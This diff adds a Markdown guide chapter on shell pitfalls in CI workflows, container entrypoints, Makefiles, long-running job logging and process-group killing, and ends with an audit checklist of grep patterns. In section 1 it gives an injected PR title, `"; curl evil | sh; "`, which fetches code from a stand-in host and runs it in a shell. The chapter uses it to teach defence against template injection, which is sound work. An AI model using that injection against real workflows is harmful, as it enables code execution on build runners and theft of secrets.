@@ -1,0 +1,285 @@
+# 04 — CI & Operational Scripts
+
+Shell embedded in CI YAML, container entrypoints, Makefiles, and long-running jobs.
+Smaller file; pipeline-wide hardening lives in [`sota-devsecops`](../../sota-devsecops/SKILL.md).
+
+## 1. GitHub Actions (and CI generally) shell pitfalls
+
+**Default shell is not your preamble.** On Linux runners GitHub Actions runs `run:` steps
+with `bash -e` (no `pipefail`, no `-u`). Set it explicitly per workflow/job:
+
+```yaml
+defaults:
+  run:
+    shell: bash   # 'bash' keyword = bash --noprofile --norc -eo pipefail {0}
+```
+
+The bare `shell: bash` keyword adds `-o pipefail`; still no `-u` — put `set -u` (or the
+full `set -euo pipefail`) at the top of nontrivial steps.
+
+**`${{ }}` is template injection, not a variable.** Expressions are substituted into the
+script *before* the shell parses it — a PR title of `"; curl evil | sh; "` executes:
+
+```yaml
+# CRITICAL
+- run: echo "PR title: ${{ github.event.pull_request.title }}"
+
+# GOOD — pass via env; shell sees a normal quoted variable
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: printf 'PR title: %s\n' "$TITLE"
+```
+
+Treat ALL `github.event.*`, branch names, commit messages, issue/PR text as attacker-
+controlled. Lint with `actionlint` (embeds ShellCheck for run blocks) and audit with
+`zizmor` (template injection, credential persistence, excessive permissions). Full
+taxonomy → [`sota-devsecops`](../../sota-devsecops/SKILL.md).
+
+**Multiline `run:` blocks**: each step is one script — a failing middle line only stops
+the step because of `-e`; verify the effective shell options for your CI (GitLab Runner's
+bash/sh shell sets `errexit`, and `pipefail` wherever the shell supports it — so an image
+with no bash whose `sh` is an older dash (e.g. Debian bookworm's) silently runs without it;
+source: `shells/bash.go`, present since at least v15.0.0, checked 2026-09-26; a Jenkins
+`sh` step with no `#!` line runs as `sh -xe` — the global Shell executable, default `sh`
+on PATH — and a `#!` first line drops both flags; durable-task `BourneShellScript.java`).
+YAML quoting compounds shell quoting: prefer `run: |` literal blocks; avoid `run: "..."`
+double-quoted YAML where `\` and `"` get re-escaped.
+
+**Step outputs/files**: quote and delimit anything written to `$GITHUB_OUTPUT`/`$GITHUB_ENV`
+— multiline or attacker-influenced values need a random heredoc delimiter, or they inject
+extra variables:
+
+```bash
+{ printf 'body<<%s\n' "$delim"; printf '%s\n' "$body"; printf '%s\n' "$delim"; } >> "$GITHUB_OUTPUT"
+```
+
+**Beyond ~30 lines, move the step body to a committed script** (`ci/build.sh`): testable
+locally, lintable by ShellCheck directly, diffable, and immune to YAML quoting.
+
+## 1a. Never batch a state-changing command with exploratory reads
+
+Batching independent calls into one invocation is right for **reads** and wrong the moment
+one element mutates: the reads around it then describe a state that no longer exists, and
+re-running the batch repeats the mutation.
+
+```bash
+# BAD — three "checks", but the third destroys what the first just printed
+cosign public-key --sk                 # read the key
+ykman piv certificates export f9 -     # read the attestation cert
+cosign piv-tool generate-key           # <-- REGENERATES THE KEY
+```
+
+Field-reported exactly so: the recorded public key was stale within the same command.
+Harmless there because nothing had been signed with it — against a provisioned slot the
+same shape destroys a key in use.
+
+**Run mutations alone and read back in a separate call.** The tell is a verb:
+`generate`, `create`, `init`, `reset`, `rotate`, `delete`, `set-`, `apply`. If one appears
+in a batch, split it out. Note this cuts *against* the efficiency habit of grouping
+independent calls — the habit is correct and does not distinguish reads from writes, which
+is precisely why a mutation reads as "one more check".
+
+## 1b. Separate a gate from the thing it gates with `&&`, never `;`
+
+The one-liner that runs a check and then does the irreversible thing is where the
+check quietly stops mattering:
+
+```bash
+# BAD — the push runs whether or not the gate passed. `;` ignores exit status.
+./scripts/check.sh; git push
+./scripts/check.sh | tail -2; git push          # worse: the pipe hides it too
+
+# GOOD — the gate is a precondition, not a preamble
+./scripts/check.sh && git push
+./scripts/check.sh || { echo "gate failed, not pushing" >&2; exit 1; }
+git push
+```
+
+This is the *interactive* twin of `set -e` (§1, [rules/01](01-safety-baseline.md) §2): in a script errexit would
+stop you; typed at a prompt or joined with `;` in a CI `run:` block, nothing does. The
+tell is that you saw the failure scroll past and the next command ran anyway.
+
+Two aggravating factors worth naming, because they make the failure invisible rather
+than merely ignored:
+
+- **A pipe rewrites the status.** `check.sh | tail -2` reports `tail`'s success, so even
+  `&&` would not save you — read the producer's status (`${PIPESTATUS[0]}` in bash,
+  `${pipestatus[1]}` in zsh, [rules/01](01-safety-baseline.md) §3) or drop the pipe.
+- **A newline is a `;`.** In a multi-line command, each line runs whatever the one above
+  it returned: an edit script that *asserts* its replacement landed fails, and the next
+  line still builds, publishes or pushes the unedited file (measured bash and zsh,
+  2026-10-25; field-reported 2026-10-24, where the assertion failed and the action ran). An
+  assertion gates only what is joined to it: end the line with `&&`, or put the sequence
+  in a script under `set -e`. An agent harness running a multi-line command, foreground or
+  background, reports the **last line's** status: a commit blocked by a failing hook, then
+  `echo "rc=$?"` and an `&&` chain on the next line, is announced as exit 0 with HEAD
+  unmoved (field-reported 2026-10-26; reproduced 2026-10-27 in bash and zsh, where the
+  `&&`-joined control reported 1; [rules/01](01-safety-baseline.md) §2a). End the chain in
+  an explicit token: `git commit … && echo COMMITTED || { echo FAILED; exit 1; }`.
+- **Diff-based checks can legitimately differ before and after a push**, because their
+  merge base changes. Re-run the gate *after* the branch exists upstream before
+  concluding the tree is broken — and never let the first, pre-push result authorise the
+  push.
+
+## 2. Container entrypoint scripts
+
+**`exec` the final process — non-negotiable.** Without `exec`, the shell stays as PID 1,
+your app is a child, and `docker stop`/Kubernetes sends SIGTERM to the *shell*, which does
+not forward it; the app gets SIGKILL after the grace period (data loss, dropped requests).
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+# setup: render config, wait-for-deps, migrations...
+exec "$@"            # replaces shell; app becomes PID 1, receives signals directly
+```
+
+- `CMD`/args pass through as `"$@"` — keeps `docker run image alternate-command` working.
+- PID 1 extras: no default reaping of orphaned zombies and some default-signal quirks —
+  if the app forks workers and doesn't reap, add a minimal init (`docker run --init`,
+  tini, or Kubernetes' shared PID namespace) rather than shell loops.
+- If the entrypoint must stay resident (rare — e.g., multi-process wrapper), it must
+  `trap 'kill -TERM "$child"' TERM INT`, start the child with `&`, and `wait "$child"`
+  in a loop (re-`wait` after the trap fires to collect the real status).
+
+**Privilege drop**: run the image as root only long enough to fix volume permissions,
+then drop — `exec gosu app:app "$@"` or `exec su-exec app:app "$@"` (alpine). Never
+`sudo` (TTY/signal/env baggage) and never `su - app -c "..."` (re-parses the command
+string — injection; and signals stop at `su`). Prefer `USER app` in the Dockerfile when
+no root setup is needed at all.
+
+**Dialect**: alpine/distroless-adjacent base images have no bash — entrypoints there are
+`#!/bin/sh` + busybox-clean ([rules/02](02-robustness-correctness.md) §5), or you install bash explicitly. CRLF line
+endings in an entrypoint produce `/usr/bin/env: 'bash\r': No such file` — enforce LF via
+`.gitattributes` (`*.sh text eol=lf`).
+
+## 3. Makefile shell gotchas
+
+- **Each recipe line is a separate shell.** `cd dir` on one line does not affect the next.
+  Either chain with `&&` + backslash continuations, or use `.ONESHELL:` (GNU make ≥3.82)
+  to run the whole recipe in one shell.
+- **Make's default shell is `/bin/sh`** and default flags are `-c` only — no `-e`!
+  A failing command in the middle of a `cmd1; cmd2` line does not stop the recipe. Set:
+
+```make
+SHELL := bash
+.SHELLFLAGS := -euo pipefail -c
+.ONESHELL:
+.DELETE_ON_ERROR:      # remove half-built targets when a recipe fails
+MAKEFLAGS += --no-builtin-rules
+```
+
+  With `.ONESHELL`, `.SHELLFLAGS` must include `-c` last; without `-e` semantics only the
+  last line's status fails the recipe.
+- **`$$` escaping**: make expands `$` itself — shell variables in recipes are `$$var`,
+  `$$(cmd)`, awk fields `$$1`. A single `$var` silently expands a (usually empty) make
+  variable — classic silent-corruption bug:
+
+```make
+# BAD — $f is the make variable 'f' (empty); loop body runs once with empty name
+clean-logs:
+	for f in *.log; do rm -f $f; done
+# GOOD
+clean-logs:
+	for f in ./*.log; do rm -f -- "$$f"; done
+```
+
+- `@` hides commands and their context when they fail — avoid on nontrivial lines, or
+  pair with explicit error messages.
+- Recipes longer than ~5 lines: move to `scripts/*.sh` and call it — ShellCheck can't see
+  inside Makefiles, and `$$`-doubling makes review error-prone.
+
+## 4. Long-running script logging
+
+Deploy/migration/batch scripts that run for minutes need logs usable during *and* after.
+
+- **Timestamps on every line.** Pipe through a stamper rather than littering `date` calls:
+
+```bash
+log() { printf '%(%Y-%m-%dT%H:%M:%S%z)T %s\n' -1 "$*"; }          # bash ≥4.2, no fork
+main 2>&1 | while IFS= read -r line; do log "$line"; done          # stamp child output
+# or: ts '%FT%T%z' (moreutils), or systemd-cat / logger for the journal/syslog
+```
+
+- **Line buffering**: a script piping into `tee`/a file sees child stdout switch to 4–64 KB
+  block buffering — logs appear in bursts and the tail is lost on crash. Force line mode
+  for chatty children: `stdbuf -oL -eL cmd | tee "$log"` (GNU coreutils).
+- Standard capture pattern — console and file, stderr distinguishable:
+
+```bash
+exec > >(stdbuf -oL tee -a "$logfile") 2>&1
+```
+
+  Note: process substitution may still be flushing when the script exits; for strict
+  ordering on exit, `wait` is not available for procsubs portably — accept it or log to
+  file directly and `tail -f` separately.
+- Progress/heartbeat for anything > ~60s silent (CI runners kill "stalled" jobs;
+  e.g. `printf 'still waiting for %s (%ds)\n' "$svc" "$elapsed"` every 15–30s in wait loops).
+- Log decisions and inputs (versions, target, flags) at start; final status + duration at
+  end; everything through the stderr/stdout discipline of [rules/02](02-robustness-correctness.md) §3 so CI annotates
+  errors correctly.
+- Cron jobs: cron's environment is minimal (PATH=/usr/bin:/bin, no profile) — set PATH
+  in-script ([rules/03](03-security.md) §3); redirect both streams to a log or you get silent failures /
+  mail spam: `*/5 * * * * /opt/job.sh >>/var/log/job.log 2>&1`.
+
+## 5. Killing a backgrounded build orphans its children
+
+A backgrounded build is a process **tree**. `kill <pid>` reaps the shell you started and
+leaves the compiler running:
+
+```
+kill 92354                 # the runner shell — returns instantly, looks done
+# still running:
+#   97262  cargo test --tests --manifest-path … --target-dir …/llvm-cov-target
+#   97082  cargo-llvm-cov llvm-cov --workspace --all-features …
+#    8676  …/debug/deps/integration-…            <- from an EARLIER run
+```
+
+Why it matters beyond tidiness: restart now and two builds contend for one `target/`, and
+**the second run's failure gets attributed to the change you are testing**. That is the same
+misattribution as [`sota-code-security` rules/15](../../sota-code-security/rules/15-instruments-and-guards.md) §2.1's sixth mode, arriving through the
+environment instead of the harness.
+
+Kill the **group**, having started it in its own: `setsid cmd &` then `kill -- -"$pgid"`.
+([`rules/05`](05-constructs-and-cleanup.md) §3 shows the inside-the-script half — `trap 'trap - TERM; kill -TERM -- -$$'`
+forwards a signal to your own group, and only works when the script leads that group;
+this is the same mechanism applied from outside.)
+Otherwise sweep by pattern — and **verify the sweep before restarting**, because `pkill -f`
+matches the sweeping shell's own argv ([`rules/01`](01-safety-baseline.md) §3) and a survivor is invisible until it
+corrupts the next run.
+
+## Audit checklist
+
+- [ ] **Background builds are killed by process group, not by pid (§5)**, and the sweep is
+      verified before a restart — an orphaned compiler contends for `target/` and the next
+      run's failure then reads as a defect in the change under test
+
+- [ ] **No compound invocation mixes reads with a mutation** (§1a). Grep batched commands
+      for `generate|create|init|reset|rotate|delete|set-|apply`; a mutation among reads
+      makes every reading around it stale and repeats on re-run. High on hardware, where
+      the mutation is usually irreversible.
+
+- [ ] **Gate-then-act joined by `;`** (§1b): `grep -rnE '\.(sh|py)[^&|]*; *(git (push|tag|commit)|kubectl|terraform apply|rm )' --include='*.sh' .` — a check whose exit status the next command ignores. Also flag `check | tail`/`| head` before an action: the pipe hides the producer's status. In a multi-line command, an asserting line not ending in `&&` gates nothing: a newline is a `;`.
+- [ ] Workflows (§1): `grep -rnE '[$][{][{][^}]*github\.[][A-Za-z0-9_.*]*(body|default_branch|email|head_ref|label|message|name|page_name|ref|title|commits)([^A-Za-z0-9_]|$)' .github/ | grep -vE '^[^:]*:[0-9]+:[[:space:]]*[A-Z_][A-Z0-9_]*:[[:space:]]'` (GitHub's untrusted suffixes, plus `commits`; `NAME: ${{ … }}` `env:` lines are filtered out) inside `run:` → injection: CRITICAL from a fork PR/issue into a secrets-bearing job, MEDIUM in a no-secret read-only job ([`sota-devsecops` rules/01](../../sota-devsecops/rules/01-pipeline-security.md) §1.5); fix via `env:` indirection.
+- [ ] `ls .github/workflows/ >/dev/null && grep -rL --include='*.yml' --include='*.yaml' -e 'shell: bash' -e 'pipefail' .github/workflows/`
+      — steps relying on default shell semantics → MEDIUM (§1). (Not `.github/workflows/*.yml`:
+      that misses `*.yaml` and, unmatched, aborts zsh with `no matches found`.)
+- [ ] `>> "$GITHUB_OUTPUT"` / `$GITHUB_ENV` writes of non-constant values without heredoc
+      delimiters → HIGH (§1).
+- [ ] Run `actionlint` (embeds ShellCheck) and `zizmor` on workflows; `hadolint` on
+      Dockerfiles (DL4006 pipefail-in-RUN, SC-rules inside RUN). `run: "…"` double-quoted YAML, or a `run:` body beyond ~30
+      lines not moved to a committed script (§1) → LOW.
+- [ ] Entrypoints (§2): `grep -rn --include='*entrypoint*' -e '"\$@"' . | grep -v 'exec '` — final command lacking
+      `exec` → HIGH (signal loss); `su -c`/`sudo` for privilege drop instead of
+      gosu/su-exec/USER → HIGH. A resident entrypoint with no `trap … TERM` forwarding and re-`wait`; a forking app with no init (`--init`, tini).
+- [ ] `#!/usr/bin/env bash` entrypoint with alpine/busybox base image in Dockerfile (§2) → HIGH.
+- [ ] `git ls-files --eol -- '*.sh'` showing `w/crlf` (§2) → HIGH for any image-bound script;
+      missing `*.sh text eol=lf` in `.gitattributes` → LOW.
+- [ ] Makefiles (§3): missing `.SHELLFLAGS`/`SHELL := bash` where recipes use bashisms;
+      `grep -nE '(^|[^$])[$][a-zA-Z_]' Makefile` inside recipes for single-`$` shell vars
+      (silent empty expansion) → HIGH; multi-line recipes without `&&` or `.ONESHELL`.
+- [ ] Missing `.DELETE_ON_ERROR` in Makefiles producing artifacts → MEDIUM (§3); `@` on a nontrivial recipe line with no explicit error
+      message, or a recipe beyond ~5 lines not moved to `scripts/*.sh` → LOW.
+- [ ] Long-running scripts (§4): no timestamps, no heartbeat in wait loops, `tee` without
+      `stdbuf -oL` for crash-time tails, no inputs logged at start or status and duration at end → LOW/MEDIUM.
+- [ ] Crontabs/`cron.d` (§4): entries without output redirection or with implicit PATH → MEDIUM.
